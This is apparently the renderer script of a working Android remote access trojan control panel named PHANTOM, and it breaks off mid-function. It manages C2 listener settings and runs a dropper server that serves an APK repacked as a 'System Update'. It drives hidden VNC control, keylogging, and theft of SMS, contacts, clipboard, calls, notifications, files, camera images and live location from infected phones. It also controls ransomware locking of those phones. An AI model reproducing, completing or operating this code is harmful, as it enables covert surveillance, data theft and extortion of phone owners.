let isListenerRunning = false;
let selectedDeviceId = null;
let currentDataTab = 'sms';
let currentBuildInProgress = false;
let latestUiTree = null;
let hvncAutoFrameTimer = null;
let autoLocTimer = null;
let keylogLines = [];
let notificationLines = [];
let mapSatellite = true;
let hvncHitboxesEnabled = false;
let appsCache = [];
let dropperRunning = false;
let logTabActive = 'accessibility';
let logAll = [];
let logAccessibility = [];
let logDevices = [];
let logCommands = [];
let logErrors = [];
let devicesTabActive = 'cards';
let ransomCurrentVariant = 'CLASSIC';
let aiAnalysisRunning = false;
let aiAnalysisReport = '';
let totalCommandsSent = 0;

document.addEventListener('DOMContentLoaded', function () {
    setupTabs();
    setupEventListeners();
    setupBuildLogListener();
    setupServerLogListener();
    setupDeviceLogListener();
    setupDeviceListeners();
    setupDataListeners();
    setupCommandResultListener();
    setupUiTreeListener();
    setupStreamListeners();
    setupLocationListener();
    setupCameraListener();
    setupFilesListener();
    setupUserDataListener();
    setupDropperListeners();
    setupRansomListener();
    setupAiAnalysisListeners();
    loadPCIP();
    loadDevices();
    loadDropperToken();
    checkDropperStatus();
    loadSettings();
    addLog('info', 'PHANTOM initialized');
});

function setupTabs() {
    var items = document.querySelectorAll('.nav-item');
    for (var i = 0; i < items.length; i++) {
        (function (item) {
            item.addEventListener('click', function () { showTab(item.getAttribute('data-tab')); });
        })(items[i]);
    }
}

function showTab(tabName) {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    var nav = document.querySelector('.nav-item[data-tab="' + tabName + '"]');
    if (nav) nav.classList.add('active');

    document.querySelectorAll('.tab-content').forEach(t => {
        t.classList.remove('active');
        t.classList.remove('workspace-active');
    });
    var tab = document.getElementById(tabName);
    if (tab) {
        tab.classList.add('active');
        if (tabName === 'hvnc') tab.classList.add('workspace-active');
    }
    if (tabName === 'devices') loadDevices();
    if (tabName === 'data') showData(currentDataTab);
    if (tabName === 'keylog') renderKeylog();
    if (tabName === 'notifications') loadNotifications();
    if (tabName === 'apps') getApps();
    if (tabName === 'ransomware') ransomSync();
    if (tabName === 'builder') { loadPCIP(); loadDropperToken(); checkDropperStatus(); }
    if (tabName === 'logs') renderLogs();
    if (tabName === 'ai-analysis') renderAiAnalysisPane();
    if (tabName === 'settings') loadSettings();
    if (tabName === 'hvnc') {
        renderHvncDeviceList();
        if (!latestUiTree) hvncGetUiTree();
    }
}

function setupEventListeners() {
    var s = document.getElementById('hvnc-type-buffer');
    if (s) s.addEventListener('keydown', function (e) { if (e.key === 'Enter' && e.ctrlKey) { e.preventDefault(); hvncSendText(); } });
    var search = document.getElementById('apps-search');
    if (search) search.addEventListener('input', function () { renderAppsList(appsCache); });
    
    var saveBtn = document.getElementById('btn-save-settings');
    if (saveBtn) {
        saveBtn.addEventListener('click', async () => {
            const cfg = {
                c2Host: document.getElementById('settings-c2host').value,
                c2Port: parseInt(document.getElementById('settings-c2port').value),
                android: {
                    sdkPath: document.getElementById('settings-sdk').value,
                    applicationId: document.getElementById('settings-appid').value
                }
            };
            try {
                const r = await window.api.configSave(cfg);
                if (r.ok) alert('Settings saved successfully!');
                else alert('Failed to save settings.');
            } catch (e) { alert('Error: ' + e.message); }
        });
    }
}

async function loadSettings() {
    try {
        const res = await window.api.configGet();
        if (res && res.ok && res.config) {
            const c = res.config;
            document.getElementById('settings-c2host').value = c.c2Host || '';
            document.getElementById('settings-c2port').value = c.c2Port || 8080;
            document.getElementById('settings-sdk').value = (c.android && c.android.sdkPath) ? c.android.sdkPath : '';
            document.getElementById('settings-appid').value = (c.android && c.android.applicationId) ? c.android.applicationId : '';
        }
    } catch (e) {}
}

async function resetWelcome() {
    try { await window.api.welcomeReset(); } catch(e) {}
}

function setupBuildLogListener() {
    window.api.onBuildLog(function (data) {
        var c = document.getElementById('build-log-content');
        if (!c) return;
        var line = document.createElement('div');
        line.className = 'log-line';
        if (data.type === 'error') line.classList.add('error');
        if (data.type === 'success') line.classList.add('success');
        line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + data.message;
        c.appendChild(line);
        c.scrollTop = c.scrollHeight;
    });
}

function setupServerLogListener() { window.api.onServerLog(function (line) { addLog('info', line); }); }

function setupDeviceLogListener() {
    window.api.onDeviceLog(function (id, level, msg) {
        addLog(level === 'ERROR' ? 'error' : 'info', '[phone ' + id.substring(0, 8) + '] ' + msg);
    });
}

function setupDropperListeners() {
    window.api.onDropperLog(function (line) {
        var c = document.getElementById('dropper-log-content');
        if (!c) return;
        var el = document.createElement('div');
        el.className = 'log-line';
        if (line.indexOf('[REJECT]') !== -1 || line.indexOf('[ERR]') !== -1) el.classList.add('error');
        else if (line.indexOf('[SERVE]') !== -1) el.classList.add('success');
        el.textContent = line;
        c.appendChild(el);
        c.scrollTop = c.scrollHeight;
    });
    window.api.onDropperStatus(function (running) {
        dropperRunning = running;
        updateDropperStatusUI(running);
    });
}

async function checkDropperStatus() {
    try {
        var r = await window.api.dropperServerStatus();
        dropperRunning = r && r.running;
        updateDropperStatusUI(dropperRunning);
    } catch (e) { }
}

function updateDropperStatusUI(running) {
    var dot = document.getElementById('dropper-status-dot');
    var txt = document.getElementById('dropper-status-text');
    var startBtn = document.getElementById('dropper-start-btn');
    var stopBtn = document.getElementById('dropper-stop-btn');
    if (running) {
        if (dot) { dot.classList.remove('offline'); dot.classList.add('online'); }
        if (txt) txt.textContent = 'Running :8090';
        if (startBtn) startBtn.disabled = true;
        if (stopBtn) stopBtn.disabled = false;
    } else {
        if (dot) { dot.classList.remove('online'); dot.classList.add('offline'); }
        if (txt) txt.textContent = 'Stopped';
        if (startBtn) startBtn.disabled = false;
        if (stopBtn) stopBtn.disabled = true;
    }
}

async function runRepackBuild() {
    if (currentBuildInProgress) return;
    currentBuildInProgress = true;
    var c = document.getElementById('build-log-content');
    if (c) c.innerHTML = '';
    var b = document.getElementById('build-both-btn');
    if (b) { b.disabled = true; b.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Repacking…'; }

    var c2Ip = document.getElementById('ip-address') ? document.getElementById('ip-address').value : null;
    var c2Port = document.getElementById('port-number') ? parseInt(document.getElementById('port-number').value) : null;
    try {
        var r = await window.api.repackBuild({ c2Ip: c2Ip, c2Port: c2Port, keepBuild: false, buildDropper: true });
        if (r && r.ok) addLog('success', 'Repack complete: ' + r.apk);
        else addLog('error', 'Repack failed: ' + (r && r.error));
    } catch (e) { addLog('error', 'Repack exception: ' + e.message); }
    finally {
        currentBuildInProgress = false;
        if (b) { b.disabled = false; b.innerHTML = '<i class="fas fa-hammer"></i> <span id="build-btn-label">Build System Update</span>'; }
    }
}

async function loadPCIP() {
    try {
        var r = await window.api.getPCIP();
        if (r && r.success) {
            var f = document.getElementById('ip-address');
            if (f) f.value = r.primary;
            var urlEl = document.getElementById('dropper-url');
            if (urlEl) {
                var port = document.getElementById('dropper-port') ? document.getElementById('dropper-port').value : 8090;
                urlEl.value = 'http://' + r.primary + ':' + port + '/XE.apk';
            }
        }
    } catch (e) { }
}

async function loadDropperToken() {
    try {
        var r = await window.api.dropperGetToken();
        if (r && r.ok) { var f = document.getElementById('dropper-token'); if (f) f.value = r.token; }
    } catch (e) { }
}

async function regenerateDropperToken() {
    if (!confirm('Generate a new token?')) return;
    var r = await window.api.dropperRegenerateToken();
    if (r && r.ok) { var f = document.getElementById('dropper-token'); if (f) f.value = r.token; addLog('success', 'New token: ' + r.token); }
}

async function saveDropperToken() {
    var f = document.getElementById('dropper-token');
    if (!f) return;
    var t = f.value.trim();
    if (t.length !== 16 || !/^[a-f0-9]+$/i.test(t)) { alert('Token must be 16 hex characters'); return; }
    var r = await window.api.dropperSetToken(t);
    if (r && r.ok) addLog('success', 'Token saved');
}

function copyDropperUrl() {
    var el = document.getElementById('dropper-url');
    if (!el) return;
    navigator.clipboard.writeText(el.value).then(function () { addLog('success', 'URL copied'); });
}

function openDropperUrl() {
    var el = document.getElementById('dropper-url');
    if (!el) return;
    window.api.openExternal(el.value);
}

async function startDropperServer() {
    var c = document.getElementById('dropper-log-content');
    if (c) c.innerHTML = '';
    addLog('info', 'Starting dropper server...');
    var r = await window.api.dropperServerStart();
    if (r && r.ok) { addLog('success', 'Dropper started'); updateDropperStatusUI(true); }
    else addLog('error', 'Dropper start failed');
}

async function stopDropperServer() {
    var r = await window.api.dropperServerStop();
    if (r && r.ok) { addLog('success', 'Dropper stopped'); updateDropperStatusUI(false); }
}

function switchBuilderTab(tab) {
    document.querySelectorAll('.builder-tab').forEach(function (b) {
        b.classList.remove('active');
        if (b.getAttribute('data-buildertab') === tab) b.classList.add('active');
    });
    document.querySelectorAll('.builder-tab-content').forEach(function (c) { c.style.display = 'none'; });
    var el = document.getElementById('builder-tab-' + tab);
    if (el) el.style.display = 'flex';
}

function switchDevicesTab(tab) {
    devicesTabActive = tab;
    document.querySelectorAll('.devices-tab').forEach(function (b) {
        b.classList.remove('active');
        if (b.getAttribute('data-devicestab') === tab) b.classList.add('active');
    });
    if (tab === 'cards') renderDevicesCards();
    else renderDevicesList();
}

function selectRansomVariant(v) {
    ransomCurrentVariant = v;
    document.querySelectorAll('.ransom-variant-card').forEach(function (c) {
        c.classList.remove('active');
        if (c.getAttribute('data-variant') === v) c.classList.add('active');
    });
    var hidden = document.getElementById('ransom-variant');
    if (hidden) hidden.value = v;
}

async function toggleListener() {
    var pf = document.getElementById('port-number');
    var port = pf ? parseInt(pf.value) || 8080 : 8080;
    if (isListenerRunning) {
        var r = await window.api.stopListener();
        if (r && r.success) { isListenerRunning = false; updateListenerUI(false, port); }
    } else {
        var r2 = await window.api.startListener(port);
        if (r2 && r2.success) {
            isListenerRunning = true;
            updateListenerUI(true, port);
            addLog('success', 'RAT listener on ' + port);
        } else addLog('error', 'Listener failed: ' + (r2 && r2.error));
    }
}

function updateListenerUI(running, port) {
    var s = document.getElementById('server-status');
    var d = document.getElementById('server-status-dot');
    var b = document.getElementById('start-listener-btn');
    if (running) {
        if (s) s.textContent = 'Running :' + port;
        if (d) { d.classList.remove('offline'); d.classList.add('online'); }
        if (b) { b.innerHTML = '<i class="fas fa-stop"></i> Stop'; b.style.background = '#ff0000'; b.style.color = '#fff'; }
    } else {
        if (s) s.textContent = 'Stopped';
        if (d) { d.classList.remove('online'); d.classList.add('offline'); }
        if (b) { b.innerHTML = '<i class="fas fa-play"></i> Start'; b.style.background = '#00ff00'; b.style.color = '#000'; }
    }
}

async function loadDevices() {
    try {
        var devices = await window.api.getDevices();
        
        // Update Dashboard Stats
        var a = document.getElementById('active-devices');
        var t = document.getElementById('total-devices');
        if (a) a.textContent = devices.filter(d => d.status === 'online').length;
        if (t) t.textContent = devices.length;

        // Update specific UI based on active tab
        if (devicesTabActive === 'cards') renderDevicesCards();
        else renderDevicesList();
        renderHvncDeviceList();
        renderAiDeviceSelect();
    } catch (e) { }
}

async function renderDevicesCards() {
    var wrap = document.getElementById('device-list');
    if (!wrap) return;
    try {
        var devices = await window.api.getDevices();
        wrap.innerHTML = '';
        if (!devices || !devices.length) { wrap.innerHTML = '<div class="empty-state"><p>No devices connected</p></div>'; return; }
        var grid = document.createElement('div');
        grid.className = 'device-cards-grid';
        devices.forEach(function (d) {
            var card = document.createElement('div');
            card.className = 'device-card-v2 ' + d.status;
            if (d.id === selectedDeviceId) card.classList.add('selected');
            var a11yOn = d.accessibilityEnabled;
            var adminOn = d.adminActive;
            card.innerHTML =
                '<div class="dc-header">' +
                '<div class="dc-icon"><i class="fas fa-mobile-screen"></i></div>' +
                '<div class="dc-title"><div class="dc-model">' + escapeHtml(d.model || 'Unknown') + '</div><div class="dc-id">' + escapeHtml(d.id.substring(0, 12)) + '</div></div>' +
                '<div class="dc-status ' + d.status + '">' + (d.status === 'online' ? '●' : '○') + '</div>' +
                '</div>' +
                '<div class="dc-rows">' +
                '<div class="dc-row"><span class="dc-key"><i class="fas fa-globe"></i> Country</span><span class="dc-val">' + escapeHtml((d.country || 'unknown').toUpperCase()) + '</span></div>' +
                '<div class="dc-row"><span class="dc-key"><i class="fas fa-android"></i> Android</span><span class="dc-val">' + escapeHtml(d.androidVersion || '-') + '</span></div>' +
                '<div class="dc-row"><span class="dc-key"><i class="fas fa-battery-half"></i> Battery</span><span class="dc-val">' + (d.battery || 0) + '%</span></div>' +
                '<div class="dc-row"><span class="dc-key"><i class="fas fa-signal"></i> Carrier</span><span class="dc-val">' + escapeHtml(d.carrier || '-') + '</span></div>' +
                '<div class="dc-row"><span class="dc-key"><i class="fas fa-universal-access"></i> A11y</span><span class="dc-val ' + (a11yOn ? 'ok' : 'no') + '">' + (a11yOn ? 'ON' : 'OFF') + '</span></div>' +
                '<div class="dc-row"><span class="dc-key"><i class="fas fa-shield-halved"></i> Admin</span><span class="dc-val ' + (adminOn ? 'ok' : 'no') + '">' + (adminOn ? 'ON' : 'OFF') + '</span></div>' +
                '</div>';
            card.addEventListener('click', function () { selectDevice(d.id); });
            grid.appendChild(card);
        });
        wrap.appendChild(grid);
    } catch (e) { }
}

async function renderDevicesList() {
    var wrap = document.getElementById('device-list');
    if (!wrap) return;
    try {
        var devices = await window.api.getDevices();
        wrap.innerHTML = '';
        if (!devices || !devices.length) { wrap.innerHTML = '<div class="empty-state"><p>No devices connected</p></div>'; return; }
        var table = document.createElement('div');
        table.className = 'device-list-table';
        var head = document.createElement('div');
        head.className = 'dlt-head';
        head.innerHTML = '<div>Country</div><div>Model</div><div>Version</div><div>Battery</div><div>Accessibility</div><div>Admin</div><div>Carrier</div>';
        table.appendChild(head);
        devices.forEach(function (d) {
            var row = document.createElement('div');
            row.className = 'dlt-row ' + (d.id === selectedDeviceId ? 'selected' : '');
            row.innerHTML =
                '<div>' + escapeHtml((d.country || '-').toUpperCase()) + '</div>' +
                '<div>' + escapeHtml(d.model || '-') + '</div>' +
                '<div>' + escapeHtml(d.androidVersion || '-') + '</div>' +
                '<div>' + (d.battery || 0) + '%</div>' +
                '<div class="' + (d.accessibilityEnabled ? 'ok' : 'no') + '">' + (d.accessibilityEnabled ? 'ON' : 'OFF') + '</div>' +
                '<div class="' + (d.adminActive ? 'ok' : 'no') + '">' + (d.adminActive ? 'ON' : 'OFF') + '</div>' +
                '<div>' + escapeHtml(d.carrier || '-') + '</div>';
            row.addEventListener('click', function () { selectDevice(d.id); });
            table.appendChild(row);
        });
        wrap.appendChild(table);
    } catch (e) { }
}

function renderHvncDeviceList() {
    var wrap = document.getElementById('hvnc-device-list');
    if (!wrap) return;
    window.api.getDevices().then(function (devices) {
        wrap.innerHTML = '';
        if (!devices || !devices.length) { wrap.innerHTML = '<div class="hvnc-empty">No devices</div>'; return; }
        devices.forEach(function (d) {
            var item = document.createElement('div');
            item.className = 'hvnc-device-item' + (d.id === selectedDeviceId ? ' active' : '');
            var dot = d.status === 'online' ? '\u25CF' : '\u25CB';
            var a11y = d.accessibilityEnabled ? 'A11Y:ON' : 'A11Y:OFF';
            var a11yColor = d.accessibilityEnabled ? '#00ff88' : '#ff5555';
            var admin = d.adminActive ? 'ADM:ON' : 'ADM:OFF';
            var adminColor = d.adminActive ? '#00ff88' : '#888';
            item.innerHTML = '<span class="hvnc-device-dot ' + d.status + '">' + dot + '</span>' +
                '<span class="hvnc-device-name">' + escapeHtml(d.model || 'Unknown') + '</span>' +
                '<span class="hvnc-device-id" style="color:' + a11yColor + ';font-size:9px;margin-left:4px;">' + a11y + '</span>' +
                '<span class="hvnc-device-id" style="color:' + adminColor + ';font-size:9px;margin-left:4px;">' + admin + '</span>';
            item.addEventListener('click', function () { selectDevice(d.id); });
            wrap.appendChild(item);
        });
    });
}

function selectDevice(id) {
    selectedDeviceId = id;
    renderHvncDeviceList();
    if (devicesTabActive === 'cards') renderDevicesCards();
    else renderDevicesList();
    renderAiDeviceSelect();
    addLog('info', 'Selected: ' + id.substring(0, 8) + '...');
}

async function sendCommand(cmd, params) {
    if (!selectedDeviceId) { addLog('warning', 'No device selected'); return { success: false }; }
    totalCommandsSent++;
    var cEl = document.getElementById('commands-sent');
    if (cEl) cEl.textContent = totalCommandsSent;
    try { return await window.api.sendCommand(selectedDeviceId, cmd, params || {}); }
    catch (e) { return { success: false }; }
}

// HVNC
function hvncSendText() {
    var el = document.getElementById('hvnc-type-buffer');
    if (!el) return;
    if (!el.value.length) return;
    sendCommand('TYPE', { text: el.value });
    el.value = '';
}
function hvncClearBuffer() { var el = document.getElementById('hvnc-type-buffer'); if (el) el.value = ''; }
function hvncSendKey(which) {
    var map = { 'ENTER': 66, 'BACKSPACE': 67, 'TAB': 61, 'ESCAPE': 111, 'SEARCH': 84 };
    sendCommand('KEY', { code: map[which] || 66 });
}
function hvncGesture(dir) { sendCommand('GESTURE', { direction: dir }); }
function sendPushNotif() {
    if (!selectedDeviceId) { addLog('warning', 'No device selected'); return; }
    window.api.sendCommand(selectedDeviceId, 'SHOW_NOTIFICATION', { title: 'System', body: 'Check your settings' }).then(function (r) {
        if (r && r.success) addLog('success', 'Notification sent');
        else addLog('error', 'Notification failed');
    });
}
async function hvncStartFrame() { await sendCommand('GET_ACCESSIBILITY_FRAME', {}); }
function hvncToggleAutoFrame() {
    var b = document.getElementById('hvnc-auto-frame-btn');
    if (hvncAutoFrameTimer) {
        clearInterval(hvncAutoFrameTimer);
        hvncAutoFrameTimer = null;
        if (b) b.textContent = 'Auto OFF';
    } else {
        hvncAutoFrameTimer = setInterval(function () {
            if (selectedDeviceId) sendCommand('GET_ACCESSIBILITY_FRAME', {});
        }, 3000);
        if (b) b.textContent = 'Auto ON';
    }
}
async function hvncStartStream() { await sendCommand('START_STREAM', {}); }
async function hvncStopStream() { await sendCommand('STOP_STREAM', {}); }
function showHvncFrame(b64) {
    var img = document.getElementById('hvnc-screen-img');
    var ph = document.getElementById('hvnc-screen-placeholder');
    if (!img) return;
    if (ph) ph.style.display = 'none';
    img.style.display = 'block';
    img.src = 'data:image/jpeg;base64,' + b64;
    img.onload = function () {
        if (hvncHitboxesEnabled && latestUiTree) renderHitboxes(latestUiTree);
    };
}
function toggleScreenHitboxes() {
    hvncHitboxesEnabled = !hvncHitboxesEnabled;
    var b = document.getElementById('hvnc-hitbox-btn');
    if (b) b.textContent = hvncHitboxesEnabled ? 'Hitbox ON' : 'Hitbox OFF';
    if (hvncHitboxesEnabled && latestUiTree) renderHitboxes(latestUiTree);
    else { var layer = document.getElementById('hvnc-hitbox-layer'); if (layer) layer.innerHTML = ''; }
}
function renderHitboxes(data) {
    var layer = document.getElementById('hvnc-hitbox-layer');
    var img = document.getElementById('hvnc-screen-img');
    if (!layer || !img) return;
    if (!data || !data.ok || !data.nodes) { layer.innerHTML = ''; return; }
    if (!img.complete || !img.naturalWidth || img.naturalWidth < 10) return;
    var rect = img.getBoundingClientRect();
    var parentRect = layer.parentElement.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return;
    layer.style.left = (rect.left - parentRect.left) + 'px';
    layer.style.top = (rect.top - parentRect.top) + 'px';
    layer.style.width = rect.width + 'px';
    layer.style.height = rect.height + 'px';
    layer.style.position = 'absolute';
    layer.style.pointerEvents = 'none';
    layer.style.zIndex = '10';
    layer.innerHTML = '';
    var W = data.screenWidth || 1080;
    var H = data.screenHeight || 2400;
    if (W <= 0 || H <= 0) return;
    var scaleX = rect.width / W;
    var scaleY = rect.height / H;
    data.nodes.forEach(function (n) {
        var interactive = n.clickable || n.editable || n.scrollable || n.hasClickableAncestor;
        if (!interactive) return;
        var hasTap = n.hasClickableAncestor && n.tapW && n.tapH;
        var dx = hasTap ? n.tapLeft : n.x;
        var dy = hasTap ? n.tapTop : n.y;
        var dw = hasTap ? n.tapW : n.w;
        var dh = hasTap ? n.tapH : n.h;
        var tx = hasTap ? n.tapX : (n.cx || 0);
        var ty = hasTap ? n.tapY : (n.cy || 0);
        var pxW = (dw || 0) * scaleX;
        var pxH = (dh || 0) * scaleY;
        if (pxW < 4 || pxH < 4) return;
        var div = document.createElement('div');
        div.className = 'hvnc-hitbox';
        if (n.editable) div.classList.add('hb-edit');
        if (n.password) div.classList.add('hb-pass');
        div.style.position = 'absolute';
        div.style.left = (dx * scaleX) + 'px';
        div.style.top = (dy * scaleY) + 'px';
        div.style.width = pxW + 'px';
        div.style.height = pxH + 'px';
        div.style.pointerEvents = 'auto';
        div.style.cursor = 'pointer';
        div.addEventListener('click', function (e) {
            e.stopPropagation();
            sendCommand('TAP', { x: tx, y: ty });
            setTimeout(function () { if (hvncHitboxesEnabled) hvncGetUiTree(); }, 400);
        });
        layer.appendChild(div);
    });
}
async function hvncGetUiTree() { await sendCommand('GET_UI_TREE', {}); }
function setupUiTreeListener() {
    window.api.onUiTree(function (id, data) {
        if (id !== selectedDeviceId) return;
        latestUiTree = data;
        renderHvncTree(data);
        if (hvncHitboxesEnabled) renderHitboxes(data);
    });
}
function renderHvncTree(data) {
    var wrap = document.getElementById('hvnc-tree-mockup');
    var scr = document.getElementById('hvnc-tree-screen');
    if (!scr || !wrap) return;
    if (wrap.clientWidth < 50 || wrap.clientHeight < 50) {
        requestAnimationFrame(function () { renderHvncTree(data); });
        return;
    }
    if (!data || !data.ok || !data.nodes) {
        scr.innerHTML = '<div class="hvnc-tree-empty">No UI tree — device may not have accessibility enabled</div>';
        return;
    }
    var W = data.screenWidth || 1080;
    var H = data.screenHeight || 2400;
    if (W <= 0 || H <= 0) { scr.innerHTML = '<div class="hvnc-tree-empty">Invalid screen size</div>'; return; }
    var scale = Math.min(wrap.clientHeight / H, wrap.clientWidth / W);
    if (scale <= 0) { requestAnimationFrame(function () { renderHvncTree(data); }); return; }
    var displayW = W * scale, displayH = H * scale;
    scr.style.position = 'absolute';
    scr.style.top = '50%';
    scr.style.left = '50%';
    scr.style.marginLeft = (-displayW / 2) + 'px';
    scr.style.marginTop = (-displayH / 2) + 'px';
    scr.style.width = displayW + 'px';
    scr.style.height = displayH + 'px';
    scr.innerHTML = '';
    var bg = document.createElement('div');
    bg.style.cssText = 'position:absolute;left:0;top:0;width:100%;height:100%;background:#05080f;z-index:1';
    scr.appendChild(bg);
    var countEl = document.getElementById('hvnc-node-count');
    if (countEl) countEl.textContent = (data.nodeCount || data.nodes.length || 0) + ' nodes';
    var nodes = data.nodes.slice().sort(function (a, b) { return ((b.w || 0) * (b.h || 0)) - ((a.w || 0) * (a.h || 0)); });
    nodes.forEach(function (n) {
        var hasText = n.text || n.desc;
        var interactive = n.clickable || n.editable || n.scrollable || n.hasClickableAncestor;
        if (!hasText && !interactive) return;
        var hasTap = n.hasClickableAncestor && n.tapW && n.tapH;
        var dx = hasTap ? n.tapLeft : n.x;
        var dy = hasTap ? n.tapTop : n.y;
        var dw = hasTap ? n.tapW : n.w;
        var dh = hasTap ? n.tapH : n.h;
        var tx = hasTap ? n.tapX : (n.cx || 0);
        var ty = hasTap ? n.tapY : (n.cy || 0);
        var pxW = (dw || 0) * scale;
        var pxH = (dh || 0) * scale;
        if (pxW < 3 || pxH < 3) return;
        var div = document.createElement('div');
        div.className = 'tm-node';
        if (n.editable) div.classList.add('tm-edit');
        if (n.scrollable) div.classList.add('tm-scroll');
        if (n.password) div.classList.add('tm-pass');
        if (n.focused) div.classList.add('tm-focus');
        if (n.clickable || n.hasClickableAncestor) div.classList.add('tm-click');
        div.style.cssText = 'position:absolute;left:' + (dx * scale) + 'px;top:' + (dy * scale) + 'px;width:' + pxW + 'px;height:' + pxH + 'px;z-index:2';
        var label = n.text || n.desc || '';
        if (label) {
            div.textContent = label;
            div.style.fontSize = Math.max(8, Math.min(15, pxH * 0.6)) + 'px';
            div.style.lineHeight = pxH + 'px';
        }
        div.addEventListener('click', function (e) {
            e.stopPropagation();
            sendCommand('TAP', { x: tx, y: ty });
            setTimeout(hvncGetUiTree, 350);
        });
        scr.appendChild(div);
    });
    bg.addEventListener('click', function (e) {
        var r = scr.getBoundingClientRect();
        var x = Math.round((e.clientX - r.left) / scale);
        var y = Math.round((e.clientY - r.top) / scale);
        sendCommand('TAP', { x: x, y: y });
        setTimeout(hvncGetUiTree, 350);
    });
}
function setupStreamListeners() {
    window.api.onStreamFrame(function (id, b64) { if (id === selectedDeviceId) showHvncFrame(b64); });
    window.api.onScreenFrame(function (id, b64) { if (id === selectedDeviceId) showHvncFrame(b64); });
}
function setupDeviceListeners() {
    window.api.onDeviceConnected(function (d) {
        addLog('success', 'Device ' + (d.model || d.id) + ' · a11y=' + (d.accessibilityEnabled ? 'ON' : 'OFF') + ' · admin=' + (d.adminActive ? 'ON' : 'OFF'));
        loadDevices();
    });
    window.api.onDeviceDisconnected(function (d) {
        addLog('warning', 'Device offline: ' + (d.model || d.id));
        loadDevices();
    });
}
function setupDataListeners() {
    window.api.onKeylog(function (id, d) { addKeylog(id, d); });
    window.api.onSMS(function (id, d) { if (currentDataTab === 'sms') showData('sms'); });
    window.api.onContacts(function (id, d) { if (currentDataTab === 'contacts') showData('contacts'); });
    window.api.onClipboard(function (id, d) { if (currentDataTab === 'clipboard') showData('clipboard'); });
    window.api.onCalls(function (id, d) { if (currentDataTab === 'calls') showData('calls'); });
    window.api.onApps(function (id, d) { appsCache = d || []; renderAppsList(d); });
}
function setupUserDataListener() {
    window.api.onUserData(function (id, data) {
        try {
            data.device_id = id;
            if (data.dataType === 'NOTIFICATION') {
                notificationLines.unshift({
                    time: new Date(data.timestamp || Date.now()).toLocaleTimeString(),
                    pkg: data.package || '', title: data.title || '', text: data.text || data.bigText || ''
                });
                if (notificationLines.length > 500) notificationLines.pop();
                if (document.getElementById('notifications').classList.contains('active')) renderNotifications();
            }
        } catch (e) { }
    });
}
function setupRansomListener() {
    window.api.onRansomSync(function (id, msg) {
        if (id !== selectedDeviceId) return;
        var a = document.getElementById('ransom-status-active');
        var r = document.getElementById('ransom-status-remaining');
        var v = document.getElementById('ransom-status-variant');
        if (a) { a.textContent = msg.active ? 'YES' : 'NO'; a.style.color = msg.active ? '#00ff88' : '#888'; }
        if (r) {
            if (msg.remainingMs && msg.remainingMs > 0) {
                var sec = Math.floor(msg.remainingMs / 1000);
                var hh = Math.floor(sec / 3600), mm = Math.floor((sec % 3600) / 60), ss = sec % 60;
                r.textContent = (hh < 10 ? '0' : '') + hh + ':' + (mm < 10 ? '0' : '') + mm + ':' + (ss < 10 ? '0' : '') + ss;
            } else r.textContent = '-';
        }
        if (v) v.textContent = msg.variant || '-';
    });
}
function setupCommandResultListener() {
    window.api.onCommandResult(function (id, cmd, res) {
        addLog('info', '[' + cmd + '] ' + res);
        if (cmd === 'RANSOM_START' || cmd === 'RANSOM_STOP' ||
            cmd === 'RANSOM_RELEASE' || cmd === 'RANSOM_EXTEND' ||
            cmd === 'ADMIN_STATUS' || cmd === 'ADMIN_ACTIVATE') {
            ransomSync();
            loadDevices();
        }
    });
}
function setupLocationListener() {
    window.api.onLocation(function (id, data) {
        if (id !== selectedDeviceId) return;
        var map = document.getElementById('location-map');
        if (map) {
            var type = mapSatellite ? 'h' : 'm';
            map.innerHTML = '<iframe width="100%" height="100%" frameborder="0" style="border:0" src="https://maps.google.com/maps?q=' + data.lat + ',' + data.lng + '&t=' + type + '&z=18&output=embed"></iframe>';
        }
        var la = document.getElementById('loc-lat'); if (la) la.textContent = (data.lat || 0).toFixed(6);
        var lo = document.getElementById('loc-lng'); if (lo) lo.textContent = (data.lng || 0).toFixed(6);
        var ac = document.getElementById('loc-acc'); if (ac) ac.textContent = (data.acc || 0).toFixed(1) + ' m';
        var ti = document.getElementById('loc-time'); if (ti) ti.textContent = new Date().toLocaleTimeString();
    });
}
function toggleAutoLocation() {
    var b = document.getElementById('auto-loc-btn');
    if (autoLocTimer) {
        clearInterval(autoLocTimer); autoLocTimer = null;
        if (b) b.innerHTML = '<i class="fas fa-toggle-off"></i> Auto OFF';
    } else {
        autoLocTimer = setInterval(function () { sendCommand('GET_LOCATION'); }, 10000);
        if (b) b.innerHTML = '<i class="fas fa-toggle-on"></i> Auto ON';
        sendCommand('GET_LOCATION');
    }
}
function toggleMapStyle() {
    mapSatellite = !mapSatellite;
    var btn = document.getElementById('map-style-btn');
    if (btn) btn.innerHTML = '<i class="fas fa-layer-group"></i> ' + (mapSatellite ? 'Satellite' : 'Roadmap');
}
function setupCameraListener() {
    window.api.onCamera(function (id, b64) {
        if (id !== selectedDeviceId) return;
        var img = document.getElementById('camera-img');
        if (img) { img.style.display = 'block'; img.src = 'data:image/jpeg;base64,' + b64; }
    });
}
function setupFilesListener() {
    window.api.onFiles(function (id, data) { if (id === selectedDeviceId) renderFiles(data); });
    window.api.onFileData(function (id, name, b64) {
        try {
            var bin = atob(b64);
            var arr = new Uint8Array(bin.length);
            for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
            var blob = new Blob([arr]);
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url; a.download = name; a.click();
            setTimeout(function () { URL.revokeObjectURL(url); }, 1500);
        } catch (e) { }
    });
}
async function listFiles(path) {
    var p = path || document.getElementById('files-path').value;
    var fp = document.getElementById('files-path');
    if (fp) fp.value = p;
    await sendCommand('FILES_LIST', { path: p });
}
function renderFiles(data) {
    var list = document.getElementById('files-list');
    if (!list) return;
    list.innerHTML = '';
    if (!data || !data.files || !data.files.length) { list.innerHTML = '<div class="empty-state"><p>Empty</p></div>'; return; }
    data.files.sort(function (a, b) {
        if (a.dir !== b.dir) return a.dir ? -1 : 1;
        return a.name.localeCompare(b.name);
    });
    data.files.forEach(function (f) {
        var row = document.createElement('div');
        row.className = 'file-row';
        row.innerHTML = '<span class="file-icon">' + (f.dir ? '[DIR]' : '[FILE]') + '</span><span class="file-name">' + escapeHtml(f.name) + '</span><span class="file-size">' + (f.dir ? '' : (f.size / 1024).toFixed(1) + ' KB') + '</span>';
        row.addEventListener('click', function () { if (f.dir) listFiles(f.path); else sendCommand('FILES_PULL', { path: f.path }); });
